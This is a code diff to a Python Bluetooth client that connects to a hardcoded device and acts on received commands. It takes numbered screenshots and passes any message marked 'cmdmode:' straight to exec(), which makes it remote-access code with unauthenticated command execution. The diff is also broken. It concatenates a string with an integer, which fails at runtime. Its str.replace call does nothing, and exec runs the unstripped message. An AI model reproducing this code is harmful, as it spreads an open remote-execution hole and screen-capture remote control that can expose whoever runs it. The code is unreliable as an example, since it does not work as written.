@@ -3,6 +3,8 @@ import ClientUI
 import threading
 import pyautogui
 import os 
+
+screeniecounter = 0
 client = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
 client.connect(("6c:2f:80:71:84:8b", 4))
 
@@ -22,7 +24,8 @@ try:
         elif dec == "2" and not th.is_alive():
             th.start()
         elif dec == "3":
-            pyautogui.screenshot().save("Screenshot.png")
+            pyautogui.screenshot().save("Screenshot"+screeniecounter + ".png")
+            screeniecounter = screeniecounter + 1
         elif "cmdmode:" in  dec:
             str.replace('cmdmode:', '')
             exec(dec)
